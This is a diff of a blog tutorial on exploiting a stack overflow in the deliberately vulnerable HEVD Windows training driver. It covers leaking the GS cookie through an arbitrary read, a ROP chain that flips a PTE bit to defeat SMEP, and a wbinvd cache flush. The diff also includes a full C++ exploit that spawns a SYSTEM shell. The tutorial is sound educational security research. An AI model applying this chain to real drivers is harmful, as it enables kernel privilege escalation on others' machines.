@@ -29,10 +29,10 @@ The exploitation steps are:
 2. Bypass GS stack protection
 3. Bypass SMEP
 4. Putting it all together
-
+  
 
 ## Analyzing the vulnerability
-Finding the vulnerable function is not interesting in HEVD because the driver is filled with debug prints, so we'll skip it and go directly to that function.
+Finding the vulnerable function is not interesting in HEVD because the driver is filled with debug prints that spoil it, so we'll skip it and go directly to that function.
 The decompiled function is pretty straight forward:  
 ![](/assets/images/bof_gs/bufferOverflowGS_internal_decompilation.jpg)
 
@@ -42,14 +42,14 @@ A good thing to note here is that IDA (7.5) ignores calls to Stack Cookie checks
 Most of the exploitation tutorials on bypassing GS protections use the exception handler as the [bypass](https://web.archive.org/web/20201206144133/https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/) [method](http://ith4cker.com/content/uploadfile/201601/716b1451824309.pdf?tonalq=jvb2o3). It makes use of the fact that **if** the vulnerable function is wrapped with try/except then on 32-bit programs it will cause an exception handler address to be placed on the stack right beside the stack cookie. Then, overwriting that handler and causing an exception before the function gets to checking the cookie causes the exception handler to be called and in an exploit - our own pointer that we've put there.  
 But in 64-bit program [this is not how it works](https://www.osronline.com/article.cfm%5earticle=469.htm#:~:text=Because%20the%20x64,within%20the%20module) anymore. It was changed because the overhead of putting the exception handler on the stack every time is costly and because it was susceptible to buffer overflow attacks.  
 Therefore we'll need to find another way to bypass that protection.  
-
+  
 
 ## GS Stack Protection bypass
 When inspecting the stack we see we have nothing useful for us to overwrite past the buffer so we'll need to chain another vulnerability. This is pretty common practice, and to be fair the second vulnerability we will use here is a basic one: Arbitrary Read.  
 
 In HEVD this vulnerability is found actually in the Write-What-Where code, but instead of writing a buffer of our own (what) to a chosen address (where) - we will write a chosen address (what) to our buffer (where). This effectively gets us our arbitrary read.  
 So, how do we use the arbitrary read to bypass GS stack protection? to answer that we'll recap shortly how it's implemented:
-1. The cookie is initialized by the _\_\_security_init_cookie_ function to a random value in the VCRuntime entry point. Interesting to note that it's saved at the first QWORD of the _\_data_ section:
+1. The cookie is initialized by the _\_\_security_init_cookie_ function to a random value in the VCRuntime entry point. Note here that it's saved at the first QWORD of the _\_data_ section:
 ![](/assets/images/bof_gs/gs_imp_2.jpg)
 
 2. At the start of a function that has a "vulnerable" buffer, right after saving non-volatile registers and allocating space on the stack for local variables, the stack cookie is saved on the stack. It isn't saved as-is, but it's xored with the current RSP value:
@@ -116,7 +116,6 @@ while (pProcessInfo != NULL) {
             break;
         }
     }
-
     if (!pProcessInfo->NextEntryOffset) {
         pProcessInfo = NULL;
     } else {
@@ -151,11 +150,11 @@ intptr_t stackSearch = (intptr_t)stackLimit - 0xff0;
 
 BOOL foundControlCode = FALSE;
 while (stackSearch < (intptr_t)stackLimit - 0x10) {
-    wwwBuf.what = stackSearch;
-    wwwBuf.where = &whereBuffer;
+    arbReadBuf.readAddress = readAddress;
+    arbReadBuf.outBuf = &readBuffer;
 
-    bResult = DeviceIoControl(hDevice, HEVD_IOCTL_ARBITRARY_WRITE, &wwwBuf, sizeof(wwwBuf), NULL, 0, &junk, (LPOVERLAPPED)NULL);
-    if (whereBuffer == HEVD_IOCTL_ARBITRARY_WRITE) {
+    bResult = DeviceIoControl(hDevice, HEVD_IOCTL_ARBITRARY_WRITE, &arbReadBuf, sizeof(arbReadBuf), NULL, 0, &junk, (LPOVERLAPPED)NULL);
+    if (readBuffer == HEVD_IOCTL_ARBITRARY_WRITE) {
         printf("[*] Found CTL_CODE in the stack at: 0x%llx\n", stackSearch);
         foundControlCode = TRUE;
         break;
@@ -260,9 +259,9 @@ pfn 78189     ---DA--UWEV  pfn 8000a     ---DA--UWEV  pfn 7c58b     ---DA--UWEV 
 PXE/PTE/PPE all indicate "U", as it should be, because it's really a user mode address. But the PTE shows "K" because we changed it with our exploit.
 Continuing the exploit now will result in an exception: ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY.  
 This is a known BSOD that comes from... SMEP protection?!
-![](/assets/images/bof_gs/butwhy.jpg)
+![](/assets/images/bof_gs/butwhy_small.jpg)
 
-After some debugging I got a tip that maybe it's a cache problem. Of course, that's all the point of the [TLB](https://en.wikipedia.org/wiki/Translation_lookaside_buffer).  
+After some debugging I got a tip that maybe it's a cache problem. Of course! that's all the point of the [TLB](https://en.wikipedia.org/wiki/Translation_lookaside_buffer).  
 The TLB is a small buffer in the CPU that caches page table entries of recently accessed virtual memory addresses.
 The problem is that when the ROP chain runs and reaches our shellcode, the shellcode is still in the TLB from when we initialized it. We need to make sure that when the ROP runs, we'll get a miss from the TLB.
 We can solve this in two ways:
@@ -277,50 +276,48 @@ void * arr[CACHE_SPRAY_SIZE];
     char arr2[CACHE_SPRAY_SIZE];
     for (int i = 0; i < CACHE_SPRAY_SIZE; i++) {
         arr[i] = malloc(4096);
-        //arr[i] = VirtualAlloc(NULL, 5000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         *(char*)arr[i] = 1;
         arr2[i] = *(char*)arr[i];
         *(char*)arr[i] = arr2[i] + 2;
     }
 ```
-It seems to improve our exploitation chances greatly but still, every once in a while, it would crash. I tried using __clflush intrinsic on our shellcode address to flush it from cache - didn't help. I tried increasing spray numbers - didn't help.
-Also making sure our spray happens on all CPU cores didn't help.
+It seems to improve our exploitation chances greatly but still, every once in a while, it would crash. I tried using ```_mm_clflush``` intrinsic on our shellcode address to flush it from cache - didn't help. I tried increasing the spray size - didn't help.
+Also making sure our spray happens on all CPU cores didn't help. Moving on to the next option.
 
 The second method is working every time for me. It uses the [wbinvd](https://www.felixcloutier.com/x86/wbinvd) cpu instruction that invalidates internal caches. It's a privileged instruction so it can only be run in kernel mode.  
 Therefore to use it, we'll include it in our rop gadget.  
 Ideally, we would put the wbinvd gadget in our chain and run the exploit once, but in this specific case we have a very restricted stack size of 0x30 and that doesn't let us include both the SMEP bypass and the wbinvd gadget in it. No worries, we'll just run it twice - once with rop chain that flips the PTE bit, and the second time with wbinvd gadget that eventually calls our shellcode.
 ![](/assets/images/bof_gs/yay_run.jpg)
+  
+  
+## What's next
+The next post is about the type-confusion vulnerability - how to exploit it using stack pivoting, overcoming double faults and writing stack-restoring shellcode.
+  
 
-## Thanks
-
-Notes:
-1. We could use a dynamic pattern search on our loaded hevd.sys image to find the MiGetPteAddress instead of using a constant offset
-
-
+## The full, patchy code:
 ```cpp
 #include "main.h"
 
+#define USE_WBINVD
 
 BOOL ExploitStackOverflowGS()
 {
-
     HANDLE hDevice = INVALID_HANDLE_VALUE;  
     BOOL bResult = FALSE;                 
     DWORD junk = 0;                     
     char inBuf[STACK_OVERFLOW_GS_EXPLOIT_BUFFER_LENGTH] = { 'A' };
-
     char buf[1000] = { 0 };
     PDWORD fOld = NULL;
     LPVOID shellcode;
     HANDLE hFile = INVALID_HANDLE_VALUE;
 
-    hFile = CreateFile(L"sc.bin",       
-                              GENERIC_READ,  
-                              FILE_SHARE_READ, 
-                              NULL,             
+    hFile = CreateFile(L"sc.bin",               // file to open
+                              GENERIC_READ,          // open for reading
+                              FILE_SHARE_READ,       // share for reading
+                              NULL,                  // default security
                               OPEN_EXISTING,         // existing file only
                               FILE_ATTRIBUTE_NORMAL, // normal file
-                              NULL);                
+                              NULL);                 // no attr. template
 
     if (hFile == INVALID_HANDLE_VALUE) {
         printf("[-] Failed to open sc.bin file for reading\n");
@@ -338,10 +335,10 @@ BOOL ExploitStackOverflowGS()
     printf("[*] Shellcode size is: %d\n", scSize);
 
     shellcode = VirtualAlloc(
-        NULL,               // Next page to commit
-        scSize,             // Page size, in bytes
-        MEM_COMMIT | MEM_RESERVE,   // Allocate a committed page
-        PAGE_EXECUTE_READWRITE);    // Read/write access
+        NULL,				// Next page to commit
+        scSize,		        // Page size, in bytes
+        MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
+        PAGE_EXECUTE_READWRITE);	// Read/write access
 
     if (shellcode == NULL) {
         printf("[-] Unable to reserve memory for shellcode!\n");
@@ -416,7 +413,6 @@ BOOL ExploitStackOverflowGS()
     intptr_t hevdDataSection = hevdDataSectionOffset + (intptr_t)hevdBase;
     printf("[*] The .data section of hevd.sys in the kernel is at: 0x%llx\n", hevdDataSection);
 
-
     hDevice = CreateFileW(DRIVER_NAME,          // drive to open
                           0,                // no access to the drive
                           FILE_SHARE_READ | // share mode
@@ -433,15 +429,15 @@ BOOL ExploitStackOverflowGS()
     }
     printf("[*] Opened driver handle\n");
 
-    ULONGLONG whereBuffer = 0;
-    WriteWhatWhereBuffer wwwBuf = { 0 };
-    wwwBuf.what = hevdDataSection;
-    wwwBuf.where = &whereBuffer;
+    ULONGLONG readBuffer = 0;
+    ArbitraryReadBuffer arbReadBuf = { 0 };
+    arbReadBuf.readAddress = hevdDataSection;
+    arbReadBuf.outBuf = &readBuffer;
 
     printf("[+] Leaking the stack cookie from the .data section\n");
     bResult = DeviceIoControl(hDevice,                       // device to be queried
                               HEVD_IOCTL_ARBITRARY_WRITE, // operation to perform
-                              &wwwBuf, sizeof(wwwBuf),                       // no input buffer
+                              &arbReadBuf, sizeof(arbReadBuf),                       // no input buffer
                               NULL, 0,            // output buffer
                               &junk,                         // # bytes returned
                               (LPOVERLAPPED)NULL);          // synchronous I/O
@@ -452,17 +448,15 @@ BOOL ExploitStackOverflowGS()
         goto _cleanup;
     }
 
-    if (whereBuffer == 0) {
+    if (readBuffer == 0) {
         printf("[-] Failed leaking the stack cookie\n");
         bResult = FALSE;
         goto _cleanup;
     }
-    ULONGLONG stackCookie = whereBuffer;
+    ULONGLONG stackCookie = readBuffer;
     printf("[*] Stack cookie is: 0x%llx\n", stackCookie);
 
     /////// Leak stack base
-
-
     HMODULE ntdll = GetModuleHandleA("ntdll");
     _NtQuerySystemInformation query = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
     if (query == NULL) {
@@ -517,12 +511,12 @@ BOOL ExploitStackOverflowGS()
 
     BOOL foundControlCode = FALSE;
     while (stackSearch < (intptr_t)stackLimit - 0x10) {
-        wwwBuf.what = stackSearch;
-        wwwBuf.where = &whereBuffer;
+        arbReadBuf.readAddress = stackSearch;
+        arbReadBuf.outBuf = &readBuffer;
 
         bResult = DeviceIoControl(hDevice,                       // device to be queried
                                   HEVD_IOCTL_ARBITRARY_WRITE, // operation to perform
-                                  &wwwBuf, sizeof(wwwBuf),                       // no input buffer
+                                  &arbReadBuf, sizeof(arbReadBuf),                       // no input buffer
                                   NULL, 0,            // output buffer
                                   &junk,                         // # bytes returned
                                   (LPOVERLAPPED)NULL);          // synchronous I/O
@@ -532,7 +526,7 @@ BOOL ExploitStackOverflowGS()
             bResult = FALSE;
             goto _cleanup;
         }
-        if (whereBuffer == 0x22200B) {
+        if (readBuffer == 0x22200B) {
             printf("[*] Found CTL_CODE in the stack at: 0x%llx\n", stackSearch);
             foundControlCode = TRUE;
             break;
@@ -553,16 +547,20 @@ BOOL ExploitStackOverflowGS()
     ULONGLONG xoredCookie = rsp ^ stackCookie;
     printf("[*] Xored cookie is: 0x%llx\n", xoredCookie);
 
+    // Insert cookie into buffer
+    *(ULONGLONG*)(inBuf + 512) = xoredCookie;
+;
+
     /////// Flip the Owner bit for our shellcode's PTE
     // Add 0x13 to read only the PTE base
     uintptr_t readAddress = (uintptr_t)ntoskrnlBase + MiGetPteAddressOffset + 0x13;
-    wwwBuf.what = readAddress;
-    wwwBuf.where = &whereBuffer;
+    arbReadBuf.readAddress = readAddress;
+    arbReadBuf.outBuf = &readBuffer;
 
-    printf("[+] Getting PTE_BASE value\n");
+    printf("[+] Getting PteBase value\n");
     bResult = DeviceIoControl(hDevice,                       // device to be queried
                               HEVD_IOCTL_ARBITRARY_WRITE, // operation to perform
-                              &wwwBuf, sizeof(wwwBuf),                       // no input buffer
+                              &arbReadBuf, sizeof(arbReadBuf),                       // no input buffer
                               NULL, 0,            // output buffer
                               &junk,                         // # bytes returned
                               (LPOVERLAPPED)NULL);          // synchronous I/O
@@ -573,109 +571,122 @@ BOOL ExploitStackOverflowGS()
         goto _cleanup;
     }
 
-    if (whereBuffer == 0) {
+    if (readBuffer == 0) {
         printf("[-] Failed getting PteBase!\n");
         return FALSE;
     }
-    printf("[*] Got PteBase: 0x%llx\n", whereBuffer);
-    ULONGLONG pteBase = whereBuffer;
+    printf("[*] Got PteBase: 0x%llx\n", readBuffer);
+    ULONGLONG pteBase = readBuffer;
 
 
-    uintptr_t scPte = getPteAddress(shellcode, pteBase);
+    uintptr_t shellcodePte = getPteAddress(shellcode, pteBase);
     printf("[*] Shellcode at: 0x%llx\n", shellcode);
-    printf("[*] Got PteAddress of shellcode: 0x%llx\n", scPte);
+    printf("[*] Got PteAddress of shellcode: 0x%llx\n", shellcodePte);
 
     // Read the PTE data, flip the user bit and write it back
-    whereBuffer = 0;
-    wwwBuf.what = scPte;
-    wwwBuf.where = &whereBuffer;
+    readBuffer = 0;
+    arbReadBuf.readAddress = shellcodePte;
+    arbReadBuf.outBuf = &readBuffer;
 
     printf("[+] Reading our shellcode's PTE data\n");
     bResult = DeviceIoControl(hDevice,                       // device to be queried
                               HEVD_IOCTL_ARBITRARY_WRITE, // operation to perform
-                              &wwwBuf, sizeof(wwwBuf),                       // no input buffer
+                              &arbReadBuf, sizeof(arbReadBuf),                       // no input buffer
                               NULL, 0,            // output buffer
                               &junk,                         // # bytes returned
                               (LPOVERLAPPED)NULL);          // synchronous I/O
 
-    if (whereBuffer == 0) {
+    if (readBuffer == 0) {
         printf("[-] Failed getting shellcode's PTE data!\n");
         bResult = FALSE;
         goto _cleanup;
     }
-    printf("[*] PTE Data of shellcode: 0x%llx\n", whereBuffer);
+    printf("[*] PTE Data of shellcode: 0x%llx\n", readBuffer);
+
+    _mm_clflush(&shellcode);
 
     // Reset the User bit to zero - now it's kernel
-    ULONGLONG wantedPteValue = whereBuffer & ~0x4;
-
-    /*
-    *(ULONGLONG*)(inBuf + 568) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + POP_RCX);
-    *(ULONGLONG*)(inBuf + 576) = (ULONGLONG)(scPte);
-    *(ULONGLONG*)(inBuf + 584) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + POP_RAX);
-    *(ULONGLONG*)(inBuf + 592) = (ULONGLONG)(wantedPteValue);
-    *(ULONGLONG*)(inBuf + 600) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + MOV_RCX_RAX);
-    *(ULONGLONG*)(inBuf + 608) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + WBINVD_GADGET);
-
-
-    printf("[+] Trigerring BufferOverflow that bypasses SMEP and flushes the cache\n");
-    bResult = DeviceIoControl(hDevice,                       // device to be queried
-                              HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS, // operation to perform
-                              inBuf, STACK_OVERFLOW_GS_EXPLOIT_BUFFER_LENGTH,                       // no input buffer
-                              NULL, 0,            // output buffer
-                              &junk,                         // # bytes returned
-                              (LPOVERLAPPED)NULL);          // synchronous I/O
-
-    if (!bResult) {
-        printf("[-] Failed sending IOCTL\n");
-        bResult = FALSE;
-        goto _cleanup;
-    }
-    */
-
-
-   // Spray the TLB Cache
-   printf("[+] Invalidating the TLB cache\n");
-   LPVOID* arr[CACHE_SPRAY_SIZE];
-   char arr2[CACHE_SPRAY_SIZE];
-   for (int i = 0; i < CACHE_SPRAY_SIZE; i++) {
-       //arr[i] = malloc(4096);
-       arr[i] = VirtualAlloc(NULL, 5000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-       *(char *)arr[i] = 1;
-       arr2[i] = *(char*)arr[i];
-   }
-
-   printf("[*] Finished invalidating the TLB cache\n");
+    ULONGLONG wantedPteValue = readBuffer & ~0x4;
 
    // Prepare the ROP chain
     *(ULONGLONG*)(inBuf + 568) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + POP_RCX);
-    *(ULONGLONG*)(inBuf + 576) = (ULONGLONG)(scPte);
+    *(ULONGLONG*)(inBuf + 576) = (ULONGLONG)(shellcodePte);
     *(ULONGLONG*)(inBuf + 584) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + POP_RAX);
     *(ULONGLONG*)(inBuf + 592) = (ULONGLONG)(wantedPteValue);
     *(ULONGLONG*)(inBuf + 600) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + MOV_RAX_TO_PTR_RCX);
-    *(ULONGLONG*)(inBuf + 608) = (ULONGLONG)(shellcode);
+    *(ULONGLONG*)(inBuf + 608) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + JUST_RET);
 
-    printf("[+] Trigerring BufferOverflow that will run our shellcode\n");
-    bResult = DeviceIoControl(hDevice,                       // device to be queried
-                              HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS, // operation to perform
-                              inBuf, STACK_OVERFLOW_GS_EXPLOIT_BUFFER_LENGTH,                       // no input buffer
-                              NULL, 0,            // output buffer
-                              &junk,                         // # bytes returned
-                              (LPOVERLAPPED)NULL);          // synchronous I/O
+    /*
+    // Spray the TLB Cache
+    void* arr[CACHE_SPRAY_SIZE * 20];
+    char arr2[CACHE_SPRAY_SIZE * 20];
+    int idx = 0;
+    printf("[+] Invalidating the TLB cache\n");
+    for (int c = 0; c < 20; c++) {
+        DWORD_PTR res = SetThreadAffinityMask(GetCurrentThread(), 1<<c);
+        if (!res) continue;
+        printf("[*] Core: %d\n", c);
+        for (int i = 0; i < CACHE_SPRAY_SIZE; i++) {
+            idx = c * CACHE_SPRAY_SIZE + i;
+            arr[idx] = malloc(4096);
+            //arr[i] = VirtualAlloc(NULL, 5000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            *(char*)arr[idx] = 1;
+            arr2[idx] = *(char*)arr[idx];
+            *(char*)arr[idx] = arr2[idx] + 2;
+        }
+    }
+
+    printf("[*] Finished invalidating the TLB cache\n");
+    _mm_sfence();
+    */
+
+    printf("[+] Trigerring BufferOverflow that will bypass SMEP for our shellcode\n");
+    bResult = DeviceIoControl(hDevice,
+                              HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS,
+                              inBuf, STACK_OVERFLOW_GS_EXPLOIT_BUFFER_LENGTH,
+                              NULL, 0,
+                              &junk,
+                              (LPOVERLAPPED)NULL);
+
+    // Prepare the ROP chain
+    *(ULONGLONG*)(inBuf + 568) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + POP_RCX);
+    *(ULONGLONG*)(inBuf + 576) = (ULONGLONG)(shellcodePte);
+    *(ULONGLONG*)(inBuf + 584) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + POP_RAX);
+    *(ULONGLONG*)(inBuf + 592) = (ULONGLONG)(wantedPteValue);
+    *(ULONGLONG*)(inBuf + 600) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + MOV_RAX_TO_PTR_RCX);
+#ifdef USE_WBINVD
+    printf("[*] Using wbinvd gadget to invalidate cache..\n");
+    *(ULONGLONG*)(inBuf + 568) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + JUST_RET);
+    *(ULONGLONG*)(inBuf + 576) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + JUST_RET);
+    *(ULONGLONG*)(inBuf + 584) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + JUST_RET);
+    *(ULONGLONG*)(inBuf + 592) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + JUST_RET);
+    *(ULONGLONG*)(inBuf + 600) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + WBINVD_GADGET);
+#endif
+    * (ULONGLONG*)(inBuf + 608) = (ULONGLONG)(shellcode);
+
+    printf("[+] Second run\n");
+    bResult = DeviceIoControl(hDevice,
+                              HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS,
+                              inBuf, STACK_OVERFLOW_GS_EXPLOIT_BUFFER_LENGTH,
+                              NULL, 0,
+                              &junk,
+                              (LPOVERLAPPED)NULL);
 
     if (!bResult) {
         printf("[-] Failed sending IOCTL\n");
         bResult = FALSE;
         goto _cleanup;
     }
-
     printf("[*] Success! Starting shell..\n");
 
-    for (int i = 0; i < CACHE_SPRAY_SIZE; i++) {
-        VirtualFree(arr[i], 0, MEM_RELEASE);
+    /*
+    for (int i = 0; i < CACHE_SPRAY_SIZE * 20; i++) {
+        //VirtualFree(arr[i], 0, MEM_RELEASE);
+        free(arr[i]);
     }
+    */
 
     system("cmd.exe");
-    system("pause");
 
 _cleanup:
     if (hDevice) CloseHandle(hDevice);
